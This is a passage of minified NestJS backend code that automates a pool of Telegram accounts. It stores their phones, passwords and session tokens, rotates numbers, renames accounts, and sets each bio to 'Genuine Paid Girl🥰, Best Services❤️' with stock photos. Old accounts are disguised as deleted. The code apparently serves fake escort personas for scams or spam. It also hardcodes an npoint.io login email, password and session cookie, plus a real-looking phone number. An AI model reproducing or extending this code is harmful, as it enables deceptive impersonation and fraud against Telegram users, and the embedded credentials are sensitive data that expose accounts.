n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ClientModule=void 0;const n=o(3563),r=o(5839),a=o(1013),s=o(5562),c=o(3209),l=o(282),p=o(8421),d=o(7422),u=o(6061),y=o(5774),m=o(889);let h=class{};t.ClientModule=h,t.ClientModule=h=i([(0,n.Module)({imports:[y.initModule,r.MongooseModule.forFeature([{name:a.Client.name,schema:a.ClientSchema}]),(0,n.forwardRef)((()=>l.TelegramModule)),(0,n.forwardRef)((()=>p.BufferClientModule)),(0,n.forwardRef)((()=>d.UsersModule)),(0,n.forwardRef)((()=>u.ArchivedClientModule)),m.NpointModule],controllers:[c.ClientController],providers:[s.ClientService],exports:[s.ClientService]})],h)},5562:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ClientService=void 0;const a=o(2995),s=o(3563),c=o(5839),l=o(6037),p=o(1013),d=o(4374),u=o(7385),y=o(9127),m=o(9646),h=o(6185),f=o(6928),g=o(6790),v=o(6954),w=o(8938);let b=Date.now()-25e4,P=class{constructor(e,t,o,i,n,r){this.clientModel=e,this.telegramService=t,this.bufferClientService=o,this.usersService=i,this.archivedClientService=n,this.npointSerive=r,this.clientsMap=new Map,setInterval((async()=>{await this.refreshMap()}),3e5)}async checkNpoint(){const e=(await w.default.get("https://api.npoint.io/7c2682f37bb93ef486ba")).data;for(const t in e){const o=await this.findOne(t,!1);if((0,h.areJsonsNotSame)(o,e[t])){await this.findAll();const e=(0,h.mapToJson)(this.clientsMap);await this.npointSerive.updateDocument("7c2682f37bb93ef486ba",e);const t={};for(const o in e){const{session:i,mobile:n,password:r,promoteMobile:a,...s}=e[o];t[o]=s}await this.npointSerive.updateDocument("f0d1e44d82893490bbde",t);break}}}async create(e){return new this.clientModel(e).save()}async findAll(){if(this.clientsMap.size<20){const e=await this.clientModel.find({},{_id:0,updatedAt:0}).lean();for(const t of e)this.clientsMap.set(t.clientId,t);return console.log("Refreshed Clients"),e}return Array.from(this.clientsMap.values())}async findAllMasked(e){const t=await this.findAll();return(e?t.filter((t=>Object.keys(e).every((o=>t[o]===e[o])))):t).map((e=>{const{session:t,mobile:o,password:i,promoteMobile:n,...r}=e;return r}))}async refreshMap(){console.log("Refreshed Clients"),this.clientsMap.clear()}async findOne(e,t=!0){const o=this.clientsMap.get(e);if(o)return o;{const o=(await this.clientModel.findOne({clientId:e},{_id:0,updatedAt:0}).exec())?.toJSON();if(this.clientsMap.set(e,o),!o&&t)throw new s.NotFoundException(`Client with ID "${e}" not found`);return o}}async update(e,t){delete t._id,t._doc&&delete t._doc._id,await(0,h.fetchWithTimeout)(`${(0,h.ppplbot)()}&text=Updating the Existing client: ${e}`);const o=await this.clientModel.findOneAndUpdate({clientId:e},{$set:t},{new:!0,upsert:!0}).exec();if(!o)throw new s.NotFoundException(`Client with ID "${e}" not found`);return this.clientsMap.set(e,o),await(0,h.fetchWithTimeout)(`${process.env.uptimeChecker}/refreshmap`),await(0,h.fetchWithTimeout)(`${process.env.uptimebot}/refreshmap`),console.log("Refreshed Maps"),o}async remove(e){const t=await this.clientModel.findOneAndDelete({clientId:e}).exec();if(!t)throw new s.NotFoundException(`Client with ID "${e}" not found`);return t}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.clientModel.find(e).exec()}async setupClient(e,t){if(console.log(`Received New Client Request for - ${e}`),(0,h.toBoolean)(process.env.AUTO_CLIENT_SETUP)&&Date.now()>b+24e4){b=Date.now();const o=await this.findOne(e),i=o.mobile;await(0,h.fetchWithTimeout)(`${(0,h.ppplbot)()}&text=Received New Client Request for - ${e} - OldNumber: ${o.mobile} || ${o.username}`),console.log(t),await this.telegramService.disconnectAll();const n={availableDate:{$lte:new Date(Date.now()).toISOString().split("T")[0]},channels:{$gt:200}},r=(await this.bufferClientService.executeQuery(n,{tgId:1}))[0];try{if(r){this.telegramService.setActiveClientSetup({...t,clientId:e,existingMobile:i,newMobile:r.mobile}),await this.telegramService.createClient(r.mobile);const o=await this.telegramService.createNewSession(r.mobile);await this.telegramService.deleteClient(r.mobile),await this.updateClientSession(o)}else await(0,h.fetchWithTimeout)(`${(0,h.ppplbot)()}&text=Buffer Clients not available`),console.log("Buffer Clients not available")}catch(e){(0,h.parseError)(e),await this.telegramService.deleteClient(r.mobile),console.log("Removing buffer as error");const t=new Date(Date.now()+2592e5).toISOString().split("T")[0];await this.bufferClientService.createOrUpdate(r.mobile,{availableDate:t}),this.telegramService.setActiveClientSetup(void 0)}}else console.log("Profile Setup Recently tried, wait ::",b-Date.now())}async updateClientSession(e){try{const t=this.telegramService.getActiveClientSetup(),{days:o,archiveOld:i,clientId:n,existingMobile:r,formalities:a,newMobile:s}=t;let c;await this.telegramService.disconnectAll(),await(0,u.sleep)(2e3),await this.telegramService.createClient(s,!1,!0);const l=(n?.match(/[a-zA-Z]+/g)).toString();let p=`${l[0].toUpperCase()+l.slice(1)}_Red`+(0,h.fetchNumbersFromString)(n);c=await this.telegramService.updateUsername(s,p),await(0,h.fetchWithTimeout)(`${(0,h.ppplbot)()}&text=Updated username for NewNumber:${s} || ${c}`),await this.telegramService.deleteClient(s);const d=(await this.usersService.search({mobile:r}))[0],y=await this.findOne(n);this.update(n,{mobile:s,username:c,session:e}),await(0,h.fetchWithTimeout)(y.deployKey,{},1),await this.bufferClientService.remove(s),setTimeout((async()=>{await this.updateClient(n)}),1e4);try{if(d)try{if((0,h.toBoolean)(a)?(await this.telegramService.createClient(r,!1,!0),console.log("Started Formalities"),await this.telegramService.updateNameandBio(r,"Deleted Account",`New Acc: @${c}`),await this.telegramService.deleteProfilePhotos(r),await this.telegramService.updateUsername(r,""),await this.telegramService.updatePrivacyforDeletedAccount(r),console.log("Formalities finished"),await this.telegramService.deleteClient(r),await(0,h.fetchWithTimeout)(`${(0,h.ppplbot)()}&text=Formalities finished`)):console.log("Formalities skipped"),i){const e={mobile:r,availableDate:new Date(Date.now()+24*(o+1)*60*60*1e3).toISOString().split("T")[0],session:d.session,tgId:d.tgId,channels:170},t=await this.bufferClientService.createOrUpdate(r,e);console.log("client Archived: ",t),await(0,h.fetchWithTimeout)(`${(0,h.ppplbot)()}&text=Client Archived`)}else console.log("Client Archive Skipped"),await(0,h.fetchWithTimeout)(`${(0,h.ppplbot)()}&text=Client Archive Skipped`)}catch(e){console.log("Cannot Archive Old Client");const t=(0,h.parseError)(e);(0,h.contains)(t.message.toLowerCase(),["expired","unregistered","deactivated","session_revoked","user_deactivated_ban"])?(console.log("Deleting User: ",d.mobile),await this.bufferClientService.remove(d.mobile),await this.archivedClientService.remove(d.mobile)):console.log("Not Deleting user")}}catch(e){(0,h.parseError)(e)}this.telegramService.setActiveClientSetup(void 0),console.log("Update finished Exitting Exiiting TG Service"),await(0,h.fetchWithTimeout)(`${(0,h.ppplbot)()}&text=Update finished`),await this.telegramService.disconnectAll()}catch(e){(0,h.parseError)(e),this.telegramService.setActiveClientSetup(void 0)}}async updateClient(e){const t=await this.findOne(e);try{await g.CloudinaryService.getInstance(t?.dbcoll?.toLowerCase());const o=await this.telegramService.createClient(t.mobile,!0,!1);await(0,u.sleep)(2e3);const i=await o.getMe();if(i.username!==t.username||!i.username.toLowerCase().startsWith(i.firstName.split(" ")[0].toLowerCase())){const i=(e?.match(/[a-zA-Z]+/g)).toString();let n=`${i[0].toUpperCase()+i.slice(1)}_Red`+(0,h.fetchNumbersFromString)(e);const r=await o.updateUsername(n);await this.update(t.clientId,{username:r})}await(0,u.sleep)(2e3),i.firstName!==t.name&&await o.updateProfile(t.name,"Genuine Paid Girl🥰, Best Services❤️"),await(0,u.sleep)(3e3),await o.deleteProfilePhotos(),await(0,u.sleep)(3e3),await o.updatePrivacy(),await(0,u.sleep)(3e3);const n=process.cwd();await o.updateProfilePic(f.join(n,"dp1.jpg")),await(0,u.sleep)(3e3),await o.updateProfilePic(f.join(n,"dp2.jpg")),await(0,u.sleep)(3e3),await o.updateProfilePic(f.join(n,"dp3.jpg")),await(0,u.sleep)(2e3),await this.telegramService.deleteClient(t.mobile)}catch(e){(0,h.parseError)(e)}}async updateClients(){const e=await this.findAll();for(const t of e)await this.updateClient(t.clientId)}async generateNewSession(e,t=1){try{console.log("String Generation started"),await(0,h.fetchWithTimeout)(`${(0,h.ppplbot)()}&text=String Generation started for NewNumber:${e}`),await(0,u.sleep)(1e3);const o=await(0,h.fetchWithTimeout)(`${process.env.uptimebot}/login?phone=${e}&force=true`,{timeout:15e3},1);o?(console.log("Code Sent successfully",o.data),await(0,h.fetchWithTimeout)(`${(0,h.ppplbot)()}&text=Code Sent successfully`),await this.bufferClientService.update(e,{availableDate:new Date(Date.now()+864e5).toISOString().split("T")[0]})):(await(0,h.fetchWithTimeout)(`${(0,h.ppplbot)()}&text=Failed to send Code`),console.log("Failed to send Code",o),t<2&&(await(0,u.sleep)(8e3),await this.generateNewSession(e,t+1)))}catch(o){console.log(o),t<2&&(await(0,u.sleep)(8e3),await this.generateNewSession(e,t+1))}}async executeQuery(e,t,o,i){try{if(!e)throw new s.BadRequestException("Query is invalid.");const n=this.clientModel.find(e);return t&&n.sort(t),o&&n.limit(o),i&&n.skip(i),await n.exec()}catch(e){throw new s.InternalServerErrorException(e.message)}}async addPromoteMobile(e,t){return this.clientModel.findOneAndUpdate({clientId:e},{$addToSet:{promoteMobile:t}},{new:!0}).exec()}async removePromoteMobile(e,t){return this.clientModel.findOneAndUpdate({clientId:e},{$pull:{promoteMobile:t}},{new:!0}).exec()}};t.ClientService=P,t.ClientService=P=i([(0,s.Injectable)(),r(0,(0,c.InjectModel)(p.Client.name)),r(1,(0,s.Inject)((0,s.forwardRef)((()=>a.TelegramService)))),r(2,(0,s.Inject)((0,s.forwardRef)((()=>d.BufferClientService)))),r(3,(0,s.Inject)((0,s.forwardRef)((()=>y.UsersService)))),r(4,(0,s.Inject)((0,s.forwardRef)((()=>m.ArchivedClientService)))),n("design:paramtypes",[l.Model,a.TelegramService,d.BufferClientService,y.UsersService,m.ArchivedClientService,v.NpointService])],P)},9815:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateClientDto=void 0;const r=o(9742);class a{}t.CreateClientDto=a,i([(0,r.ApiProperty)({example:"paid_giirl_shruthiee",description:"Channel link of the user"}),n("design:type",String)],a.prototype,"channelLink",void 0),i([(0,r.ApiProperty)({example:"shruthi",description:"Database collection name"}),n("design:type",String)],a.prototype,"dbcoll",void 0),i([(0,r.ApiProperty)({example:"PaidGirl.netlify.app/Shruthi1",description:"Link of the user"}),n("design:type",String)],a.prototype,"link",void 0),i([(0,r.ApiProperty)({example:"Shruthi Reddy",description:"Name of the user"}),n("design:type",String)],a.prototype,"name",void 0),i([(0,r.ApiProperty)({example:"+916265240911",description:"Phone number of the user"}),n("design:type",String)],a.prototype,"mobile",void 0),i([(0,r.ApiProperty)({example:"Ajtdmwajt1@",description:"Password of the user"}),n("design:type",String)],a.prototype,"password",void 0),i([(0,r.ApiProperty)({example:"https://shruthi1.glitch.me",description:"Repl link of the user"}),n("design:type",String)],a.prototype,"repl",void 0),i([(0,r.ApiProperty)({example:"https://shruthiprom0101.glitch.me",description:"Promotion Repl link of the user"}),n("design:type",String)],a.prototype,"promoteRepl",void 0),i([(0,r.ApiProperty)({example:"1BQANOTEuMTA4LjUg==",description:"Session token"}),n("design:type",String)],a.prototype,"session",void 0),i([(0,r.ApiProperty)({example:"ShruthiRedd2",description:"Username of the user"}),n("design:type",String)],a.prototype,"username",void 0),i([(0,r.ApiProperty)({example:"shruthi1",description:"Client ID of the user"}),n("design:type",String)],a.prototype,"clientId",void 0),i([(0,r.ApiProperty)({example:"https://shruthi1.glitch.me/exit",description:"Deployment key URL"}),n("design:type",String)],a.prototype,"deployKey",void 0),i([(0,r.ApiProperty)({example:"ShruthiRedd2",description:"Main account of the user"}),n("design:type",String)],a.prototype,"mainAccount",void 0),i([(0,r.ApiProperty)({example:"booklet_10",description:"Product associated with the user"}),n("design:type",String)],a.prototype,"product",void 0),i([(0,r.ApiProperty)({example:["916265240911"],description:"Promote mobile number of the user",required:!1,type:[String]}),n("design:type",Array)],a.prototype,"promoteMobile",void 0)},1167:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchClientDto=void 0;const r=o(9742),a=o(4922),s=o(7403);class c{}t.SearchClientDto=c,i([(0,r.ApiPropertyOptional)({description:"Client ID of the client"}),(0,a.Transform)((({value:e})=>e?.trim().toLowerCase())),(0,s.IsOptional)(),(0,s.IsString)(),(0,s.Matches)(/^[a-z0-9_-]{3,50}$/i,{message:"Invalid client ID format"}),n("design:type",String)],c.prototype,"clientId",void 0),i([(0,r.ApiPropertyOptional)({description:"Database collection name"}),(0,a.Transform)((({value:e})=>e?.trim().toLowerCase())),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"dbcoll",void 0),i([(0,r.ApiPropertyOptional)({description:"Channel link of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"channelLink",void 0),i([(0,r.ApiPropertyOptional)({description:"Link of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsUrl)({},{message:"Invalid URL format"}),n("design:type",String)],c.prototype,"link",void 0),i([(0,r.ApiPropertyOptional)({description:"Name of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"name",void 0),i([(0,r.ApiPropertyOptional)({description:"Phone number of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.Matches)(/^\+?[0-9]{10,15}$/,{message:"Invalid phone number format"}),n("design:type",String)],c.prototype,"number",void 0),i([(0,r.ApiPropertyOptional)({description:"Password of the client"}),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"password",void 0),i([(0,r.ApiPropertyOptional)({description:"Repl link of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsUrl)({},{message:"Invalid URL format"}),n("design:type",String)],c.prototype,"repl",void 0),i([(0,r.ApiPropertyOptional)({description:"Promotion Repl link of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsUrl)({},{message:"Invalid URL format"}),n("design:type",String)],c.prototype,"promoteRepl",void 0),i([(0,r.ApiPropertyOptional)({description:"Clientname of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"clientName",void 0),i([(0,r.ApiPropertyOptional)({description:"Deployment key URL"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsUrl)({},{message:"Invalid URL format"}),n("design:type",String)],c.prototype,"deployKey",void 0),i([(0,r.ApiPropertyOptional)({description:"Main account of the client"}),(0,a.Transform)((({value:e})=>e?.trim().toLowerCase())),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"mainAccount",void 0),i([(0,r.ApiPropertyOptional)({description:"Product associated with the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"product",void 0),i([(0,r.ApiPropertyOptional)({description:"Promote mobile numbers of the client"}),(0,a.Transform)((({value:e})=>e?.map((e=>e?.trim())))),(0,s.IsOptional)(),(0,s.IsArray)(),(0,s.ArrayNotEmpty)({message:"Promote mobile numbers must not be empty if provided"}),(0,s.Matches)(/^\+?[0-9]{10,15}$/,{each:!0,message:"Invalid phone number format in promoteMobile"}),n("design:type",Array)],c.prototype,"promoteMobile",void 0)},7908:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateClientDto=void 0;const i=o(9742),n=o(9815);class r extends((0,i.PartialType)(n.CreateClientDto)){}t.UpdateClientDto=r},1013:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ClientSchema=t.Client=void 0;const r=o(5839),a=o(9742);let s=class{};t.Client=s,i([(0,a.ApiProperty)({example:"paid_giirl_shruthiee",description:"Channel link of the user"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"channelLink",void 0),i([(0,a.ApiProperty)({example:"shruthi",description:"Database collection name"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"dbcoll",void 0),i([(0,a.ApiProperty)({example:"PaidGirl.netlify.app/Shruthi1",description:"Link of the user"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"link",void 0),i([(0,a.ApiProperty)({example:"Shruthi Reddy",description:"Name of the user"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"name",void 0),i([(0,a.ApiProperty)({example:"916265240911",description:"mobile number of the user"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"mobile",void 0),i([(0,a.ApiProperty)({example:"Ajtdmwajt1@",description:"Password of the user"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"password",void 0),i([(0,a.ApiProperty)({example:"https://shruthi1.glitch.me",description:"Repl link of the user"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"repl",void 0),i([(0,a.ApiProperty)({example:"https://shruthiprom0101.glitch.me",description:"Promotion Repl link of the user"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"promoteRepl",void 0),i([(0,a.ApiProperty)({example:"1BQANOTEuM==",description:"Session token"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"session",void 0),i([(0,a.ApiProperty)({example:"ShruthiRedd2",description:"Username of the user"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"username",void 0),i([(0,a.ApiProperty)({example:"shruthi1",description:"Client ID of the user"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"clientId",void 0),i([(0,a.ApiProperty)({example:"https://shruthi1.glitch.me/exit",description:"Deployment key URL"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"deployKey",void 0),i([(0,a.ApiProperty)({example:"ShruthiRedd2",description:"Main account of the user"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"mainAccount",void 0),i([(0,a.ApiProperty)({example:"booklet_10",description:"Product associated with the user"}),(0,r.Prop)({required:!0}),n("design:type",String)],s.prototype,"product",void 0),i([(0,a.ApiProperty)({example:["916265240911"],description:"Promote mobile number of the user"}),(0,r.Prop)({required:!1,type:[String]}),n("design:type",Array)],s.prototype,"promoteMobile",void 0),t.Client=s=i([(0,r.Schema)({collection:"clients",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],s),t.ClientSchema=r.SchemaFactory.createForClass(s)},5321:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.NpointController=void 0;const a=o(3563),s=o(6954),c=o(9742);let l=class{constructor(e){this.npointService=e}async fetchDocument(e){try{return await this.npointService.fetchDocument(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async postDocument(e){try{return await this.npointService.postDocument(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.BAD_REQUEST)}}async fetchAllDocuments(){try{return await this.npointService.fetchAllDocuments()}catch(e){throw new a.HttpException(e.message,a.HttpStatus.INTERNAL_SERVER_ERROR)}}async updateDocument(e,t){try{return await this.npointService.updateDocument(e,t)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}};t.NpointController=l,i([(0,a.Get)("documents/:id"),(0,c.ApiOperation)({summary:"Fetch a document by ID"}),(0,c.ApiParam)({name:"id",description:"The ID of the document to fetch"}),(0,c.ApiResponse)({status:200,description:"Document fetched successfully"}),(0,c.ApiResponse)({status:404,description:"Document not found"}),r(0,(0,a.Param)("id")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],l.prototype,"fetchDocument",null),i([(0,a.Post)("documents"),(0,c.ApiOperation)({summary:"Post a new document"}),(0,c.ApiBody)({description:"The document to post",schema:{example:{title:"My Document",content:"This is the content of the document."}}}),(0,c.ApiResponse)({status:201,description:"Document posted successfully"}),(0,c.ApiResponse)({status:400,description:"Invalid input"}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],l.prototype,"postDocument",null),i([(0,a.Get)("documents"),(0,c.ApiOperation)({summary:"Fetch all documents"}),(0,c.ApiResponse)({status:200,description:"List of all documents fetched successfully"}),(0,c.ApiResponse)({status:500,description:"Internal server error"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],l.prototype,"fetchAllDocuments",null),i([(0,a.Put)("documents/:id"),(0,c.ApiOperation)({summary:"Update a document by ID"}),(0,c.ApiParam)({name:"id",description:"The ID of the document to update"}),(0,c.ApiBody)({description:"The updated document",schema:{example:{title:"Updated Document",content:"This is the updated content of the document."}}}),(0,c.ApiResponse)({status:200,description:"Document updated successfully"}),(0,c.ApiResponse)({status:404,description:"Document not found"}),r(0,(0,a.Param)("id")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,Object]),n("design:returntype",Promise)],l.prototype,"updateDocument",null),t.NpointController=l=i([(0,c.ApiTags)("NPoint API"),(0,a.Controller)("npoint"),n("design:paramtypes",[s.NpointService])],l)},889:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.NpointModule=void 0;const n=o(3563),r=o(6954),a=o(5321);let s=class{};t.NpointModule=s,t.NpointModule=s=i([(0,n.Module)({controllers:[a.NpointController],providers:[r.NpointService],exports:[r.NpointService]})],s)},6954:function(e,t,o){var i,n=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.NpointService=void 0;const r=o(3563),a=o(8938);let s=i=class{constructor(){this.logger=new r.Logger(i.name),this.csrfToken=null,this.cookie="_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5",this.baseUrl="https://www.npoint.io",this.signInUrl="https://www.npoint.io/users/sign_in"}async fetchCsrfToken(){this.logger.debug("Fetching CSRF token...");try{let e=JSON.stringify({user:{email:"dodieajt@gmail.com",password:"Ajtdmwajt1@"}}),t={method:"post",maxBodyLength:1/0,url:this.signInUrl,headers:{"Content-Type":"application/json",Cookie:this.cookie},data:e};const o=await a.default.request(t);if(console.log("Cookie:",o.headers["set-cookie"][0]),this.cookie=o.headers["set-cookie"][0],this.csrfToken=await this.fetchCsrfTokenFromHtml(o.data),!this.csrfToken)throw new Error("CSRF token not found in the sign-in response.");return this.logger.debug("CSRF token fetched successfully."),this.csrfToken}catch(e){throw this.logger.error(`Failed to fetch CSRF token: ${e.message}`),new Error(`Failed to fetch CSRF token: ${e.message}`)}}async ensureCsrfToken(){this.csrfToken||await this.fetchCsrfToken()}async fetchDocument(e){this.logger.debug(`Fetching document with ID: ${e}`),await this.ensureCsrfToken();try{const t=await a.default.get(`${this.baseUrl}/documents/${e}`,{headers:{"X-CSRF-Token":this.csrfToken,Cookie:this.cookie}});return this.logger.debug(`Document with ID: ${e} fetched successfully.`),t.data}catch(t){throw this.logger.error(`Failed to fetch document with ID: ${e}: ${t.message}`),new Error(`Failed to fetch document: ${t.message}`)}}async postDocument(e){this.logger.debug("Posting a new document..."),await this.ensureCsrfToken();try{const t=await a.default.post(`${this.baseUrl}/documents`,{generate_contents:!0},{headers:{"X-CSRF-Token":this.csrfToken,Cookie:this.cookie}});return this.logger.debug(`Document posted successfully. Updating document with token: ${t.data.token}`),await this.updateDocument(t.data.token,e),t.data}catch(e){throw this.logger.error(`Failed to post document: ${e.message}`),new Error(`Failed to post document: ${e.message}`)}}async updateDocument(e,t){this.logger.debug(`Updating document with ID: ${e}`),await this.ensureCsrfToken();const o={contents:JSON.stringify(t),original_contents:JSON.stringify(t),schema:null,original_schema:""};try{const t=await a.default.put(`${this.baseUrl}/documents/${e}`,o,{headers:{"X-CSRF-Token":this.csrfToken,Cookie:this.cookie}});return this.logger.debug(`Document with ID: ${e} updated successfully.`),t.data}catch(t){throw this.logger.error(`Failed to update document with ID: ${e}: ${t.message}`),new Error(`Failed to update document: ${t.message}`)}}async fetchAllDocuments(){await this.ensureCsrfToken();try{return(await a.default.get(`${this.baseUrl}/documents`,{headers:{"X-CSRF-Token":this.csrfToken,Cookie:this.cookie}})).data}catch(e){throw new Error(`Failed to fetch all documents: ${e.message}`)}}async fetchCsrfTokenFromHtml(e){try{const t=e.match(/<meta name="csrf-token" content="([^"]+)"/);if(!t||!t[1])throw new Error("CSRF token not found in the HTML response.");const o=t[1];return console.log("CSRF Token:",o),o}catch(e){console.error("Error fetching CSRF token:",e)}}};t.NpointService=s,t.NpointService=s=i=n([(0,r.Injectable)()],s)},8977:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var 